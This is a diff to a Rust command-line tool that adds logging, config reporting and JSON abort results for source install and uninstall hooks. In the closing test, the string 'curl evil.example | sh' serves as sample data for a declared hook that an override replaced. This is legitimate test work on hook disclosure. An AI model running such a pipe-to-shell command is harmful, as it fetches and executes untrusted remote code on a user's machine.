@@ -1310,6 +1310,17 @@ fn run_install_hooks(
             browse_url.as_deref(),
         );
 
+        // spec: HOOK-160 HOOK-168 -- the override's record names what it
+        // replaced, so `hooks list` finds it under the declared hooks.
+        let replaced_here: &[String] = match &replaced {
+            Some(cmds) if override_cmd == Some(h.run.as_str()) => cmds,
+            _ => &[],
+        };
+        let site = crate::hook_log::Site {
+            item: None,
+            commit: current.as_deref(),
+            replaced: replaced_here,
+        };
         match crate::hook::decide(&disclosure, h.optional, accept.event(h.event))? {
             crate::hook::HookAct::Run => {
                 // HOOK-60: indicate the running hook. A progress line, not an
@@ -1318,7 +1329,15 @@ fn run_install_hooks(
                 // `json_stdout`). spec: CLI-217
                 println!("running install hook '{}' for {}", h.label(), name);
                 // HOOK-53: a non-zero exit (optional or required) is a hard stop.
-                crate::hook::run_hook(&h.run, clone_dir, &name, "install", h.label(), hook_env)?;
+                crate::hook::run_hook(
+                    &h.run,
+                    clone_dir,
+                    &name,
+                    "install",
+                    h.label(),
+                    hook_env,
+                    site,
+                )?;
                 record_install_hook(source, &h.run, RecordedEvent::Install, current.clone());
                 stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
             }
@@ -1330,10 +1349,14 @@ fn run_install_hooks(
                     h.label(),
                     name
                 ));
+                crate::hook_log::not_run(&name, site, "install", h.label(), &h.run);
                 record_install_hook(source, &h.run, RecordedEvent::Install, None);
                 stamp_origin(source, h, RecordedEvent::Install, origin_of(h));
             }
-            crate::hook::HookAct::Abort => return Ok(HookOutcome::Abort),
+            crate::hook::HookAct::Abort => {
+                crate::hook_log::aborted(&name, site, "install", h.label(), &h.run);
+                return Ok(HookOutcome::Abort);
+            }
         }
     }
 
@@ -2490,6 +2513,10 @@ fn meld_recursive(
                     }
                     return Err(e);
                 }
+                // spec: HOOK-172 -- the nested source's own install hook
+                // failing (or a Ctrl-C in it) is not a clone failure: it
+                // stops the meld, before the source is registered.
+                Err(e) if e.is_hook_stop() => return Err(e),
                 // spec: DSC-79 -- a non-auth clone failure (network error,
                 // not-found, etc.) of a nested entry is skipped with a warning
                 // rather than hard-failing the whole meld.
@@ -2665,6 +2692,9 @@ fn meld_recursive(
                     // propagates as a generic error.
                     return Err(e);
                 }
+                // spec: HOOK-172 -- as in the loop above, a hook stop is not
+                // a clone failure.
+                Err(e) if e.is_hook_stop() => return Err(e),
                 // spec: DSC-79 -- a non-auth clone failure of a marketplace
                 // sub-source is skipped with a warning, mirroring the
                 // [discover].sources loop above.
@@ -4187,7 +4217,7 @@ fn run_uninstall_hooks(
     let (resolved, replaced) =
         crate::hook::apply_hook_override(resolved, uninstall_hook, HookEvent::Uninstall);
     let override_cmd = uninstall_hook.map(str::trim).filter(|s| !s.is_empty());
-    let replaced_note = replaced.map(|cmds| cmds.join("; "));
+    let replaced_note = replaced.as_ref().map(|cmds| cmds.join("; "));
 
     let pin_desc = pin_description(&source_pin);
     let commit = source_commit.unwrap_or_default();
@@ -4214,6 +4244,15 @@ fn run_uninstall_hooks(
             browse_url.as_deref(),
         );
 
+        let replaced_here: &[String] = match (&replaced, override_cmd) {
+            (Some(cmds), Some(cmd)) if h.run == cmd => cmds,
+            _ => &[],
+        };
+        let site = crate::hook_log::Site {
+            item: None,
+            commit: Some(commit.as_str()),
+            replaced: replaced_here,
+        };
         match crate::hook::decide(&disclosure, h.optional, accept.event(h.event))? {
             crate::hook::HookAct::Run => {
                 // HOOK-60: indicate the running hook. Same as the install-hook
@@ -4230,6 +4269,7 @@ fn run_uninstall_hooks(
                     "uninstall",
                     h.label(),
                     &hook_env,
+                    site,
                 )?;
             }
             crate::hook::HookAct::Skip => {
@@ -4239,8 +4279,10 @@ fn run_uninstall_hooks(
                     h.label(),
                     source_name
                 ));
+                crate::hook_log::not_run(source_name, site, "uninstall", h.label(), &h.run);
             }
             crate::hook::HookAct::Abort => {
+                crate::hook_log::aborted(source_name, site, "uninstall", h.label(), &h.run);
                 println!("aborted; source left in place");
                 return Ok(false);
             }
@@ -4420,6 +4462,10 @@ fn unmeld_one(
             run_uninstall_hooks(paths, &registry, idx, &source_name, uninstall_hook, accept)?;
         if !proceed {
             // User aborted the unmeld via the hook prompt; source stays.
+            // spec: CLI-153 -- still one result document under `--json`.
+            if out.json {
+                return print_json(&MutationResult::new("unmeld", &source_name, "aborted"));
+            }
             return Ok(());
         }
 
@@ -4535,6 +4581,12 @@ fn unmeld_one(
         // User aborted the source uninstall hook; source stays (items already
         // removed are kept removed, mirroring a partial teardown).
         registry.save(paths)?;
+        if out.json {
+            // spec: CLI-153
+            let mut result = MutationResult::new("unmeld", &source_name, "aborted");
+            result.count = Some(forgotten);
+            return print_json(&result);
+        }
         return Ok(());
     }
 
@@ -8480,7 +8532,14 @@ pub(crate) fn emit_meld_json_result(
     pending: usize,
     profiles: Option<Vec<String>>,
 ) -> Result<()> {
-    let mut result = MutationResult::new("meld", &summary.source_name, "melded");
+    // spec: CLI-153 -- a top-level meld registers its source unless the user
+    // aborted at an install-hook prompt (HOOK-21), so none added is an abort.
+    let outcome = if summary.added == 0 {
+        "aborted"
+    } else {
+        "melded"
+    };
+    let mut result = MutationResult::new("meld", &summary.source_name, outcome);
     result.profiles = profiles;
     result.count = Some(summary.added);
     result.skipped = summary.skipped;
@@ -9366,7 +9425,7 @@ fn copy_path_recursive(src: &std::path::Path, dst: &std::path::Path) -> Result<(
 }
 
 /// Expand a leading `~` in `path` to the home directory.
-fn expand_tilde(path: &str) -> std::path::PathBuf {
+pub(crate) fn expand_tilde(path: &str) -> std::path::PathBuf {
     if path == "~" {
         return dirs::home_dir().unwrap_or_else(|| std::path::PathBuf::from("~"));
     }
@@ -10352,6 +10411,8 @@ pub fn sync_with_selector(
                     }
                     return Err(e);
                 }
+                // spec: HOOK-172 -- a hook stop is not a clone failure.
+                Err(e) if e.is_hook_stop() => return Err(e),
                 // spec: DSC-79 -- the same non-auth clone-failure skip applies during
                 // the sync re-walk. No curator-empty guard here: the source is already
                 // melded, so DSC-80 does not apply.
@@ -11452,7 +11513,7 @@ fn rerun_source_hooks(
                     &commit,
                     &clone_path,
                     &hook.run,
-                    hook.declared_override.as_deref(),
+                    hook.declared_override().as_deref(),
                     browse_url.as_deref(),
                 );
                 // Abort is treated as Skip here (the source is already
@@ -11474,6 +11535,15 @@ fn rerun_source_hooks(
                 }
             };
 
+            let site = crate::hook_log::Site {
+                item: None,
+                commit: Some(commit.as_str()),
+                replaced: &hook.replaced,
+            };
+            if !run {
+                // spec: HOOK-160
+                crate::hook_log::not_run(&source.name, site, event, &hook.label, &hook.run);
+            }
             if run {
                 // HOOK-30: a non-zero exit is a hard error. The source stays
                 // registered; just propagate the failure.
@@ -11490,6 +11560,7 @@ fn rerun_source_hooks(
                     event,
                     &hook.label,
                     &hook_env,
+                    site,
                 ) {
                     if changed {
                         registry.save(paths)?;
@@ -11522,9 +11593,16 @@ struct UpgradeHook {
     label: String,
     optional: bool,
     /// The declared command(s) a consumer `--install-hook` override replaced,
-    /// for the loud override note in the disclosure (HOOK-56). `None` when this
-    /// is not an overriding hook.
-    declared_override: Option<String>,
+    /// for the loud override note in the disclosure (HOOK-56) and the hook's
+    /// record (HOOK-160). Empty when this is not an overriding hook.
+    replaced: Vec<String>,
+}
+
+impl UpgradeHook {
+    /// The disclosure's override note: the replaced commands, joined.
+    fn declared_override(&self) -> Option<String> {
+        (!self.replaced.is_empty()).then(|| self.replaced.join("; "))
+    }
 }
 
 /// The hooks `upgrade` should offer for one source, and the event they belong
@@ -11596,7 +11674,7 @@ fn select_upgrade_hooks(
             run: h.run.clone(),
             label: h.label().to_string(),
             optional: h.optional,
-            declared_override: None,
+            replaced: Vec::new(),
         })
         .collect();
     if keep_curated {
@@ -11610,7 +11688,7 @@ fn select_upgrade_hooks(
                     run: r.command.clone(),
                     label: r.label().to_string(),
                     optional: r.optional,
-                    declared_override: None,
+                    replaced: Vec::new(),
                 }),
         );
     }
@@ -11624,7 +11702,7 @@ fn select_upgrade_hooks(
                 run: cmd.to_string(),
                 label: cmd.to_string(),
                 optional: false,
-                declared_override: Some(replaced.join("; ")),
+                replaced,
             }];
         }
         updates.retain(|h| !hook_ran_at(source, &h.run, RecordedEvent::Update, current));
@@ -11657,9 +11735,11 @@ fn select_upgrade_hooks(
                     .find(|h| h.event == HookEvent::Install && h.run == r.command);
                 // HOOK-56: an overriding command keeps its loud note here too,
                 // naming what the source declares in its place.
-                let declared_override = (r.origin == Some(HookOrigin::Override)
-                    && !declared_install.is_empty())
-                .then(|| declared_install.join("; "));
+                let replaced = if r.origin == Some(HookOrigin::Override) {
+                    declared_install.clone()
+                } else {
+                    Vec::new()
+                };
                 UpgradeHook {
                     run: r.command.clone(),
                     label: decl
@@ -11667,7 +11747,7 @@ fn select_upgrade_hooks(
                         .unwrap_or_else(|| r.label())
                         .to_string(),
                     optional: decl.map(|d| d.optional).unwrap_or(r.optional),
-                    declared_override,
+                    replaced,
                 }
             })
             .collect(),
@@ -13307,6 +13387,27 @@ pub fn config_show(paths: &Paths) -> Result<()> {
     // environment outrank it (DSC-104), so reporting the key alone would name a
     // value that is not the one in force.
     let limit = crate::error::metadata_size_limit();
+    // spec: CLI-241 HOOK-165 HOOK-170 -- likewise the hook logging in force:
+    // `--hook-log` and `--hook-log-keep` outrank the config keys. When they
+    // agree with the keys, the keys are shown as written.
+    let config_keep = cfg.hook_log_keep.unwrap_or_default();
+    let flag_logging = crate::hook_log::logging().filter(|(logs, keep, owned)| {
+        *logs != crate::hook_log::config_logs(cfg.hook_log.as_ref(), owned, &paths.mind_home)
+            || *keep != config_keep
+    });
+    let hook_log = match &flag_logging {
+        Some((None, _, _)) => crate::config::HookLogSetting::Enabled(false),
+        Some((Some(dir), _, owned)) if dir == owned => crate::config::HookLogSetting::Enabled(true),
+        Some((Some(dir), _, _)) => crate::config::HookLogSetting::Dir(dir.display().to_string()),
+        // Unset is off, reported as `false`.
+        None => cfg
+            .hook_log
+            .clone()
+            .unwrap_or(crate::config::HookLogSetting::Enabled(false)),
+    };
+    let keep = flag_logging
+        .as_ref()
+        .map_or(config_keep, |(_, keep, _)| *keep);
     if out.json {
         return print_json(&serde_json::json!({
             "config_file": file.display().to_string(),
@@ -13318,6 +13419,11 @@ pub fn config_show(paths: &Paths) -> Result<()> {
             // i64, so a consumer that parses numbers as signed 64-bit does not
             // overflow on the unlimited cap (held as u64::MAX).
             "max_metadata_size_bytes": limit.min(i64::MAX as u64),
+            // spec: HOOK-164 HOOK-165
+            "hook_history": cfg.hook_history.unwrap_or(crate::hook_log::DEFAULT_HISTORY),
+            "hook_log": hook_log,
+            // spec: HOOK-170
+            "hook_log_keep": keep,
         }));
     }
     println!("{} config file: {}", out.bullet(), file.display());
@@ -13341,6 +13447,29 @@ pub fn config_show(paths: &Paths) -> Result<()> {
         out.dim("·"),
         crate::error::format_metadata_size(limit)
     );
+    // spec: HOOK-164 HOOK-165
+    println!(
+        "  {} hook-history = {}  (hook results kept for `mind hooks history`)",
+        out.dim("·"),
+        cfg.hook_history.unwrap_or(crate::hook_log::DEFAULT_HISTORY)
+    );
+    let hook_log = match &hook_log {
+        crate::config::HookLogSetting::Enabled(b) => b.to_string(),
+        crate::config::HookLogSetting::Dir(d) => format!("{d:?}"),
+    };
+    println!(
+        "  {} hook-log = {hook_log}  (save each hook's output to a log file)",
+        out.dim("·")
+    );
+    // spec: HOOK-170
+    let keep = match keep {
+        crate::hook_log::LogKeep::All => "all",
+        crate::hook_log::LogKeep::Failed => "failed",
+    };
+    println!(
+        "  {} hook-log-keep = {keep}  (which hook logs to keep: all, or failed only)",
+        out.dim("·")
+    );
     // spec: CLI-241 DSC-104 -- the value printed is the effective one, which
     // the flag and the environment can outrank, so say where it came from when
     // it is not what the config key says. Without this the line reads as a
@@ -13348,6 +13477,11 @@ pub fn config_show(paths: &Paths) -> Result<()> {
     // MIND_AGENT_HOMES note below exists for.
     if let Some(note) = metadata_cap_origin(crate::config::metadata_limit_origin()) {
         println!("note: {note}");
+    }
+    if flag_logging.is_some() {
+        println!(
+            "note: hook-log and hook-log-keep are set by --hook-log / --hook-log-keep for this run"
+        );
     }
     if let Some(env) = std::env::var_os("MIND_AGENT_HOMES") {
         println!(
@@ -14122,13 +14256,15 @@ fn json_mode() -> bool {
 /// `render::print_json` unchanged.
 // spec: CLI-217
 pub(crate) fn print_json<T: Serialize>(value: &T) -> Result<()> {
+    let s = serde_json::to_string_pretty(value).map_err(|e| MindError::json("json output", e))?;
     if crate::json_stdout::is_reserved() {
-        let s =
-            serde_json::to_string_pretty(value).map_err(|e| MindError::json("json output", e))?;
         crate::json_stdout::record(s);
         return Ok(());
     }
-    crate::render::print_json(value)
+    // spec: HOOK-161 -- unreserved (no redirect on this platform), the
+    // document is written here, so the hook results are added here too.
+    println!("{}", crate::json_stdout::with_hooks(s));
+    Ok(())
 }
 
 /// [`print_json`] for the `{"schema": 1, "items": [...]}` array envelope
@@ -16750,7 +16886,7 @@ mod tests {
             "the consumer's command is what runs"
         );
         assert_eq!(
-            pending.hooks[0].declared_override.as_deref(),
+            pending.hooks[0].declared_override().as_deref(),
             Some("curl evil.example | sh"),
             "the disclosure still names the declared command it replaced"
         );
